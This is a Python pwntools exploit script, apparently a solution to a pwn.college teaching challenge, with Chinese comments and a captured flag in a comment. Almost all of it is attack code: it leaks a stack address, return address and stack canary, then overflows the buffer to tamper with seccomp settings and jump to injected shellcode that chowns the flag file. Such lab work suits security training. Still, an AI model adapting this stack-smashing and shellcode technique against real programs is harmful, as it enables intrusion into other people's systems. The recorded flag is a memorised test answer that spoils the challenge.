from pwn import *

context(os='linux', arch='amd64',)

# chown 92
# pwn_college{gRLbCCVgFsufh4p-2cfD9LFhSET.dFDNywiMxkzW}

def getshellcode():
    # chown('./flag', 1000, 1000)
    shellcode = b""
    shellcode += asm("xor al, al")
    shellcode += asm("mov al, 92")
    shellcode += asm("mov rdi, 0x010166606d672e2f")
    shellcode += asm("mov r8, 0x0101010101010101")
    shellcode += asm("xor rdi, r8")
    shellcode += asm("push rdi")
    shellcode += asm("mov rdi, rsp")
    shellcode += asm("xor esi, esi")
    shellcode += asm("mov esi, 0x010102e9")
    shellcode += asm("xor edx, edx")
    shellcode += asm("mov edx, 0x01010101")
    shellcode += asm("xor esi, edx")
    shellcode += asm("mov edx, esi")
    shellcode += asm("syscall")
    shellcode += asm("int 3")
    #shellcode += asm("mov al, 60")
    #shellcode += asm("xor edi, edi")
    #shellcode += asm("syscall")
    return shellcode

if __name__ == '__main__':
    target_name = "./toddler1_level3_teaching1"
    io = process(target_name)
    # 第一次输入, 泄露stack_addr, 并写入shellcode
    io.recvuntil(b"size: ")
    io.sendline(bytes(str(12*8), encoding='utf8'))
    io.recvuntil(b"!\n")
    payload_0 = b"REPEATaa"+getshellcode()
    payload_0 += (12*8-len(payload_0))*b'b'
    io.sendline(payload_0)
    io.interactive()
    io.recvuntil(payload_0)
    rbp = io.recv(6)+b'\x00\x00'
    shellcode_addr = p64(int.from_bytes(rbp, 'little') - 136)
    # 第二次输入, 泄露vuln地址
    io.recvuntil(b"size: ")
    io.sendline(bytes(str(13*8), encoding='utf8'))
    io.recvuntil(b"!\n")
    payload_1 = b'REPEATaa'+b'b'*12*8
    io.sendline(payload_1)
    io.recvuntil(payload_1)
    vuln_ret = io.recv(6)+b'\x00\x00'
    vuln_addr = p64(int.from_bytes(vuln_ret, 'little') - 1290)
    vuln_seccomp = p64(int.from_bytes(vuln_ret, 'little') + 5)
    # 第三次输入, 泄露canary
    io.recvuntil(b"size: ")
    io.sendline(bytes(str(9*8+1), encoding='utf8'))
    io.recvuntil(b"!\n")
    payload_2 = b'REPEATaa'+b'b'*8*8+b'c'
    io.sendline(payload_2)
    io.recvuntil(payload_2)
    canary = b'\x00'+io.recv(7)
    # 第四次输入, 设置好seccomp开启号, 并泄露当前的rbp
    io.recvuntil(b"size: ")
    io.sendline(bytes(str(14*8), encoding='utf8'))
    io.recvuntil(b"!\n")
    payload_3 = b'REPEATaa'+b'A'*8*7+p32(2)+p32(40)+canary+b'B'*8*2+rbp+shellcode_addr
    rbp_1 = p64(int.from_bytes(rbp, 'little') - 624)
    #payload_3 = b'REPEATaa'+b'A'*8*11# 相差432
    # rbp_1+432=rbp
    # 432是上一个的, 这里是624
    io.sendline(payload_3)
    # 第五次输入, 覆盖第一次seccomp, 并覆盖ret为seccomp开启的位置, 并修改rbp地址, 以及后面的第二次ret
    io.recvuntil(b"size: ")
    io.sendline(bytes(str(17*8), encoding='utf8'))
    io.recvuntil(b"!\n")
    payload_4 = b'A'*8*8+p32(1)+p32(92)+canary+b'B'*8*2+rbp_1+shellcode_addr+b'C'*8+rbp+shellcode_addr
    io.sendline(payload_4)
    io.interactive()
